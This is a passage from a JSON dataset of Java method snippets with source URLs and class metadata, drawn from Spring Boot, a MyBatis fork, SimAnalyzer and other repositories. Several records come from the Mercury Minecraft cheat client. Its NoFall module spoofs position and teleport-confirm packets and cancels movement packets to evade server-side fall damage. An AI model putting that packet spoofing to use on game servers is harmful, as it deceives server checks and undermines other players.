argValues);\t\t\t\t// Check void types.\t\t\t\tif (retType.getSort() == Type.VOID)\t\t\t\t\treturn null;\t\t\t\t// Handle return value.\t\t\t\tif (retVal != null) {\t\t\t\t\tList<AbstractInsnNode> insns = distinct(combine(arguments.stream()\t\t\t\t\t\t\t.flatMap(arg -> arg.getInsns().stream())\t\t\t\t\t\t\t.collect(Collectors.toList()), min));\t\t\t\t\tif (TypeUtil.isPrimitiveDesc(retType.getDescriptor())) {\t\t\t\t\t\t// Unbox primitive wrappers if descriptor calls for it.\t\t\t\t\t\treturn unboxed(insns, retVal);\t\t\t\t\t}  else {\t\t\t\t\t\t// Not a primitive\t\t\t\t\t\treturn new SimulatedVirtualValue(insns,\t\t\t\t\t\t\t\tType.getType(retVal.getClass()), retVal, typeChecker);\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}\t\t// Invoke didn't occur, throw exception rather than return null\t\tthrow new IllegalStateException(\"Could not find method to simulate: \" +\t\t\t\towner + \".\" +  name + desc);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "unboxed", "params": ["List<AbstractInsnNode>", "Object"], "throws": null, "modifiers": ["private", "static"], "return_type": "AbstractValue", "snippet": "\tprivate static AbstractValue unboxed(List<AbstractInsnNode> insns, Object retVal) {\t\tif (retVal instanceof Integer || retVal instanceof Short || retVal instanceof Byte)\t\t\treturn PrimitiveValue.ofInt(insns, ((Number) retVal).intValue());\t\telse if (retVal instanceof Float)\t\t\treturn PrimitiveValue.ofFloat(insns, ((Float) retVal));\t\telse if (retVal instanceof Double)\t\t\treturn PrimitiveValue.ofDouble(insns, ((Double) retVal));\t\telse if (retVal instanceof Boolean)\t\t\treturn PrimitiveValue.ofInt(insns, ((Boolean) retVal) ? 1 : 0);\t\telse if (retVal instanceof Character)\t\t\treturn PrimitiveValue.ofChar(insns, (Character) retVal);\t\telse if (retVal instanceof Long)\t\t\treturn PrimitiveValue.ofLong(insns, (Long) retVal);\t\tthrow new UnsupportedOperationException(\"Unsupported boxed type: \" + retVal.getClass().getName());\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "copyValue", "params": ["Object"], "throws": null, "modifiers": ["private", "static"], "return_type": "Object", "snippet": "\tprivate static Object copyValue(Object value) {\t\tif (value instanceof String) {\t\t\treturn value.toString();\t\t} else if (value instanceof StringBuilder) {\t\t\treturn new StringBuilder(value.toString());\t\t}  else if (value instanceof StringBuffer) {\t\t\treturn new StringBuffer(value.toString());\t\t}\t\tthrow new UnsupportedOperationException(value.getClass() + \" copying not supported\");\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "isStaticMethodWhitelisted", "params": ["String", "String", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "boolean", "snippet": "\tprivate static boolean isStaticMethodWhitelisted(String owner, String name, String desc) {\t\treturn WHITELISTED_CLASSES.contains(owner);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "isStatic", "params": ["int"], "throws": null, "modifiers": ["private", "static"], "return_type": "boolean", "snippet": "\tprivate static boolean isStatic(int modifiers) {\t\treturn (modifiers & Opcodes.ACC_STATIC) == Opcodes.ACC_STATIC;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "onPushedByWater", "params": ["CallbackInfoReturnable<Boolean>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onPushedByWater(CallbackInfoReturnable<Boolean> cir) {        PushEvent event = new PushEvent(PushEvent.Type.LIQUID);        Mercury.INSTANCE.getEventManager().fireEvent(event);        if(event.isCancelled()) {            cir.setReturnValue(false);        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayer.java", "stars": "12", "class": {"name": "MixinEntityPlayer", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isDebugEnabled", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isDebugEnabled() {    return log.isDebugEnabled();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2Impl.java", "stars": "15", "class": {"name": "Log4j2Impl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "isTraceEnabled", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isTraceEnabled() {    return log.isTraceEnabled();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2Impl.java", "stars": "15", "class": {"name": "Log4j2Impl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "error", "params": ["String", "Throwable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void error(String s, Throwable e) {    log.error(s, e);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2Impl.java", "stars": "15", "class": {"name": "Log4j2Impl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "error", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void error(String s) {    log.error(s);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2Impl.java", "stars": "15", "class": {"name": "Log4j2Impl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "debug", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void debug(String s) {    log.debug(s);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2Impl.java", "stars": "15", "class": {"name": "Log4j2Impl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "trace", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void trace(String s) {    log.trace(s);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2Impl.java", "stars": "15", "class": {"name": "Log4j2Impl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "warn", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void warn(String s) {    log.warn(s);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/log4j2/Log4j2Impl.java", "stars": "15", "class": {"name": "Log4j2Impl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "setBeanNameGenerator", "params": ["BeanNameGenerator"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid setBeanNameGenerator(BeanNameGenerator beanNameGenerator) {\t\tthis.annotatedReader.setBeanNameGenerator(beanNameGenerator);\t\tthis.xmlReader.setBeanNameGenerator(beanNameGenerator);\t\tthis.scanner.setBeanNameGenerator(beanNameGenerator);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setResourceLoader", "params": ["ResourceLoader"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid setResourceLoader(ResourceLoader resourceLoader) {\t\tthis.resourceLoader = resourceLoader;\t\tthis.xmlReader.setResourceLoader(resourceLoader);\t\tthis.scanner.setResourceLoader(resourceLoader);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setEnvironment", "params": ["ConfigurableEnvironment"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid setEnvironment(ConfigurableEnvironment environment) {\t\tthis.annotatedReader.setEnvironment(environment);\t\tthis.xmlReader.setEnvironment(environment);\t\tthis.scanner.setEnvironment(environment);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "load", "params": [], "throws": null, "modifiers": [], "return_type": "int", "snippet": "\tint load() {\t\tint count = 0;\t\tfor (Object source : this.sources) {\t\t\tcount += load(source);\t\t}\t\treturn count;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "load", "params": ["Object"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "\tprivate int load(Object source) {\t\tAssert.notNull(source, \"Source must not be null\");\t\tif (source instanceof Class<?>) {\t\t\treturn load((Class<?>) source);\t\t}\t\tif (source instanceof Resource) {\t\t\treturn load((Resource) source);\t\t}\t\tif (source instanceof Package) {\t\t\treturn load((Package) source);\t\t}\t\tif (source instanceof CharSequence) {\t\t\treturn load((CharSequence) source);\t\t}\t\tthrow new IllegalArgumentException(\"Invalid source type \" + source.getClass());\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "load", "params": ["Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "\tprivate int load(Class<?> source) {\t\tif (isGroovyPresent() && GroovyBeanDefinitionSource.class.isAssignableFrom(source)) {\t\t\t// Any GroovyLoaders added in beans{} DSL can contribute beans here\t\t\tGroovyBeanDefinitionSource loader = BeanUtils.instantiateClass(source, GroovyBeanDefinitionSource.class);\t\t\tload(loader);\t\t}\t\tif (isComponent(source)) {\t\t\tthis.annotatedReader.register(source);\t\t\treturn 1;\t\t}\t\treturn 0;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "load", "params": ["GroovyBeanDefinitionSource"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "\tprivate int load(GroovyBeanDefinitionSource source) {\t\tint before = this.xmlReader.getRegistry().getBeanDefinitionCount();\t\t((GroovyBeanDefinitionReader) this.groovyReader).beans(source.getBeans());\t\tint after = this.xmlReader.getRegistry().getBeanDefinitionCount();\t\treturn after - before;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "load", "params": ["Resource"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "\tprivate int load(Resource source) {\t\tif (source.getFilename().endsWith(\".groovy\")) {\t\t\tif (this.groovyReader == null) {\t\t\t\tthrow new BeanDefinitionStoreException(\"Cannot load Groovy beans without Groovy on classpath\");\t\t\t}\t\t\treturn this.groovyReader.loadBeanDefinitions(source);\t\t}\t\treturn this.xmlReader.loadBeanDefinitions(source);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "load", "params": ["Package"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "\tprivate int load(Package source) {\t\treturn this.scanner.scan(source.getName());\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "load", "params": ["CharSequence"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "\tprivate int load(CharSequence source) {\t\tString resolvedSource = this.xmlReader.getEnvironment().resolvePlaceholders(source.toString());\t\t// Attempt as a Class\t\ttry {\t\t\treturn load(ClassUtils.forName(resolvedSource, null));\t\t}\t\tcatch (IllegalArgumentException | ClassNotFoundException ex) {\t\t\t// swallow exception and continue\t\t}\t\t// Attempt as resources\t\tResource[] resources = findResources(resolvedSource);\t\tint loadCount = 0;\t\tboolean atLeastOneResourceExists = false;\t\tfor (Resource resource : resources) {\t\t\tif (isLoadCandidate(resource)) {\t\t\t\tatLeastOneResourceExists = true;\t\t\t\tloadCount += load(resource);\t\t\t}\t\t}\t\tif (atLeastOneResourceExists) {\t\t\treturn loadCount;\t\t}\t\t// Attempt as package\t\tPackage packageResource = findPackage(resolvedSource);\t\tif (packageResource != null) {\t\t\treturn load(packageResource);\t\t}\t\tthrow new IllegalArgumentException(\"Invalid source '\" + resolvedSource + \"'\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "isGroovyPresent", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "\tprivate boolean isGroovyPresent() {\t\treturn ClassUtils.isPresent(\"groovy.lang.MetaClass\", null);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "findResources", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Resource", "snippet": "\tprivate Resource[] findResources(String source) {\t\tResourceLoader loader = (this.resourceLoader != null) ? this.resourceLoader\t\t\t\t: new PathMatchingResourcePatternResolver();\t\ttry {\t\t\tif (loader instanceof ResourcePatternResolver) {\t\t\t\treturn ((ResourcePatternResolver) loader).getResources(source);\t\t\t}\t\t\treturn new Resource[] { loader.getResource(source) };\t\t}\t\tcatch (IOException ex) {\t\t\tthrow new IllegalStateException(\"Error reading source '\" + source + \"'\");\t\t}\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "isLoadCandidate", "params": ["Resource"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "\tprivate boolean isLoadCandidate(Resource resource) {\t\tif (resource == null || !resource.exists()) {\t\t\treturn false;\t\t}\t\tif (resource instanceof ClassPathResource) {\t\t\t// A simple package without a '.' may accidentally get loaded as an XML\t\t\t// document if we're not careful. The result of getInputStream() will be\t\t\t// a file list of the package content. We double check here that it's not\t\t\t// actually a package.\t\t\tString path = ((ClassPathResource) resource).getPath();\t\t\tif (path.indexOf('.') == -1) {\t\t\t\ttry {\t\t\t\t\treturn Package.getPackage(path) == null;\t\t\t\t}\t\t\t\tcatch (Exception ex) {\t\t\t\t\t// Ignore\t\t\t\t}\t\t\t}\t\t}\t\treturn true;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "findPackage", "params": ["CharSequence"], "throws": null, "modifiers": ["private"], "return_type": "Package", "snippet": "\tprivate Package findPackage(CharSequence source) {\t\tPackage pkg = Package.getPackage(source.toString());\t\tif (pkg != null) {\t\t\treturn pkg;\t\t}\t\ttry {\t\t\t// Attempt to find a class in this package\t\t\tResourcePatternResolver resolver = new PathMatchingResourcePatternResolver(getClass().getClassLoader());\t\t\tResource[] resources = resolver\t\t\t\t\t.getResources(ClassUtils.convertClassNameToResourcePath(source.toString()) + \"/*.class\");\t\t\tfor (Resource resource : resources) {\t\t\t\tString className = StringUtils.stripFilenameExtension(resource.getFilename());\t\t\t\tload(Class.forName(source.toString() + \".\" + className));\t\t\t\tbreak;\t\t\t}\t\t}\t\tcatch (Exception ex) {\t\t\t// swallow exception and continue\t\t}\t\treturn Package.getPackage(source.toString());\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "isComponent", "params": ["Class<?>"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "\tprivate boolean isComponent(Class<?> type) {\t\t// This has to be a bit of a guess. The only way to be sure that this type is\t\t// eligible is to make a bean definition out of it and try to instantiate it.\t\tif (MergedAnnotations.from(type, SearchStrategy.TYPE_HIERARCHY).isPresent(Component.class)) {\t\t\treturn true;\t\t}\t\t// Nested anonymous classes are not eligible for registration, nor are groovy\t\t// closures\t\treturn !type.getName().matches(\".*\\\\$_.*closure.*\") && !type.isAnonymousClass()\t\t\t\t&& type.getConstructors() != null && type.getConstructors().length != 0;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "BeanDefinitionLoader", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "matchClassName", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\t\tprotected boolean matchClassName(String className) {\t\t\treturn this.classNames.contains(className);\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/BeanDefinitionLoader.java", "stars": "47572", "class": {"name": "ClassExcludeFilter", "extends": "AbstractTypeHierarchyTraversingFilter", "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "createData", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "AnyData", "snippet": "    public AnyData createData() throws Exception {        if (!isOk())            return null;        return new Region(                nameField.getText(),                governorField.getText(),                Integer.parseInt(squareField.getText()),                adminCenterField.getText()        );    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/RegionDlg.java", "stars": "2", "class": {"name": "RegionDlg", "extends": "Dlg", "implements": null, "modifiers": ["public"]}}, {"method_name": "getAnchor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BadgeAnchor", "snippet": "    public BadgeAnchor getAnchor() {        return mAnchor;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/badge/BadgeRule.java", "stars": "1", "class": {"name": "BadgeRule", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAnchor", "params": ["BadgeAnchor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAnchor(BadgeAnchor anchor) {        mAnchor = anchor;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/badge/BadgeRule.java", "stars": "1", "class": {"name": "BadgeRule", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOffset", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getOffset() {        return mOffset;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/badge/BadgeRule.java", "stars": "1", "class": {"name": "BadgeRule", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setOffset", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOffset(int offset) {        mOffset = offset;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/badge/BadgeRule.java", "stars": "1", "class": {"name": "BadgeRule", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onEnable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEnable() {        super.onEnable();            if (mc.world != null) {                this.teleportId = 0;                this.packets.clear();                final CPacketPlayer bounds = new CPacketPlayer.Position(mc.player.posX, mc.player.posY <= 10 ? 255 : 1, mc.player.posZ, mc.player.onGround);                this.packets.add(bounds);                mc.player.connection.sendPacket(bounds);            }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/player/NoFall.java", "stars": "12", "class": {"name": "NoFall", "extends": "Module", "implements": null, "modifiers": ["public"]}}, {"method_name": "onUpdate", "params": ["UpdateEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onUpdate(UpdateEvent event) {            if (this.teleportId <= 0) {                final CPacketPlayer bounds = new CPacketPlayer.Position(mc.player.posX, mc.player.posY <= 10 ? 255 : 1, mc.player.posZ, mc.player.onGround);                this.packets.add(bounds);                mc.player.connection.sendPacket(bounds);                return;            }            double posY = -0.00000001;            if (mc.player.fallDistance > 1.5){                mc.player.setVelocity(0,0,0);                for (int i = 0; i <= 3; i++) {                        mc.player.setVelocity(0, posY - 0.0625 * i, 0);                        move(0, posY - 0.0625 * i, 0);                    }                }            }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/player/NoFall.java", "stars": "12", "class": {"name": "NoFall", "extends": "Module", "implements": null, "modifiers": ["public"]}}, {"method_name": "onPacket", "params": ["PacketEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPacket(PacketEvent event) {        if (mc.player != null && mc.player.fallDistance > 1.5) {            switch (event.getType()) {                case INCOMING:                    if (event.getPacket() instanceof SPacketPlayerPosLook) {                        final SPacketPlayerPosLook packet = (SPacketPlayerPosLook) event.getPacket();                        if (Minecraft.getMinecraft().player.isEntityAlive() && Minecraft.getMinecraft().world.isBlockLoaded(new BlockPos(Minecraft.getMinecraft().player.posX, Minecraft.getMinecraft().player.posY, Minecraft.getMinecraft().player.posZ)) && !(Minecraft.getMinecraft().currentScreen instanceof GuiDownloadTerrain)) {                            if (this.teleportId <= 0) {                                this.teleportId = packet.getTeleportId();                            } else {                                event.setCancelled(true);                            }                        }                    }                    break;                case OUTGOING:                    if (event.getPacket() instanceof CPacketPlayer && !(event.getPacket() instanceof CPacketPlayer.Position)) {                        event.setCancelled(true);                    }                    if (event.getPacket() instanceof CPacketPlayer) {                        final CPacketPlayer packet = (CPacketPlayer) event.getPacket();                        if (packets.contains(packet)) {                            packets.remove(packet);                            return;                        }                        event.setCancelled(true);                    }                    break;            }        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/player/NoFall.java", "stars": "12", "class": {"name": "NoFall", "extends": "Module", "implements": null, "modifiers": ["public"]}}, {"method_name": "move", "params": ["double", "double", "double"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void move(double x, double y, double z) {        final Minecraft mc = Minecraft.getMinecraft();        final CPacketPlayer pos = new CPacketPlayer.Position(mc.player.posX + x, mc.player.posY + y, mc.player.posZ + z, mc.player.onGround);        this.packets.add(pos);        mc.player.connection.sendPacket(pos);        final CPacketPlayer bounds = new CPacketPlayer.Position(mc.player.posX + x, mc.player.posY <= 10 ? 255 : 1, mc.player.posZ + z, mc.player.onGround);        this.packets.add(bounds);        mc.player.connection.sendPacket(bounds);        this.teleportId++;        mc.player.connection.sendPacket(new CPacketConfirmTeleport(this.teleportId - 1));        mc.player.connection.sendPacket(new CPacketConfirmTeleport(this.teleportId));        mc.player.connection.sendPacket(new CPacketConfirmTeleport(this.teleportId + 1));    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/player/NoFall.java", "stars": "12", "class": {"name": "NoFall", "extends": "Module", "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {    // create an SqlSessionFactory    try (Reader reader = Resources.getResourceAsReader(        \"org/apache/ibatis/submitted/optional_on_mapper_method/mybatis-config.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    // populate in-memory database    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),        \"org/apache/ibatis/submitted/optional_on_mapper_method/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/optional_on_mapper_method/OptionalOnMapperMethodTest.java", "stars": "15", "class": {"name": "OptionalOnMapperMethodTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "returnNotNullOnAnnotation", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void returnNotNullOnAnnotation() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      Optional<User> user = mapper.getUserUsingAnnotation(1);      assertTrue(user.isPresent());      assertEquals(\"User1\", user.get().getName());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/optional_on_mapper_method/OptionalOnMapperMethodTest.java", "stars": "15", "class": {"name": "OptionalOnMapperMethodTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "returnNullOnAnnotation", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void returnNullOnAnnotation() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      Optional<User> user = mapper.getUserUsingAnnotation(3);      assertFalse(user.isPresent());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/optional_on_mapper_method/OptionalOnMapperMethodTest.java", "stars": "15", "class": {"name": "OptionalOnMapperMethodTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "returnNotNullOnXml", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void returnNotNullOnXml() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      Optional<User> user = mapper.getUserUsingXml(2);      assertTrue(user.isPresent());      assertEquals(\"User2\", user.get().getName());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/optional_on_mapper_method/OptionalOnMapperMethodTest.java", "stars": "15", "class": {"name": "OptionalOnMapperMethodTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "returnNullOnXml", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void returnNullOnXml() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      Optional<User> user = mapper.getUserUsingXml(3);      assertFalse(user.isPresent());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/optional_on_mapper_method/OptionalOnMapperMethodTest.java", "stars": "15", "class": {"name": "OptionalOnMapperMethodTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "returnOptionalFromSqlSession", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void returnOptionalFromSqlSession() {    try (SqlSession sqlSession = Mockito.spy(sqlSessionFactory.openSession())) {      User mockUser = new User();      mockUser.setName(\"mock user\");      Optional<User> optionalMockUser = Optional.of(mockUser);      doReturn(optionalMockUser).when(sqlSession).selectOne(any(String.class), any(Object.class));      Mapper mapper = sqlSession.getMapper(Mapper.class);      Optional<User> user = mapper.getUserUsingAnnotation(3);      assertSame(optionalMockUser, user);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/optional_on_mapper_method/OptionalOnMapperMethodTest.java", "stars": "15", "class": {"name": "OptionalOnMapperMethodTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "onScrolled", "params": ["android", "int", "int"], "throws": null, "modifiers": ["public"], 